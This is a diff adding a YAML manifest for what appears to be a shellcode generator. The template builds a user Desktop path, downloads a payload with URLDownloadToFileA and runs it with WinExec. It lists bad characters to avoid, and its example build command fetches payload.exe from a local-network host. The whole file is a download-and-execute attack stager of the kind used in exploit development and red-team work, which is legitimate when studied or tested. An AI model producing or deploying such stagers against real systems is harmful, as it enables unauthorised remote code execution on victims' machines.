@@ -1,0 +1,15 @@
+template: ir_download_to_userpath
+# IR workflow: build user Desktop path, URLDownloadToFileA, WinExec.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_download_to_userpath.yaml \
+#       --url "http://192.168.1.100:8000/payload.exe" \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - GetUserNameA
+  - URLDownloadToFileA
+  - WinExec
+  - ExitProcess
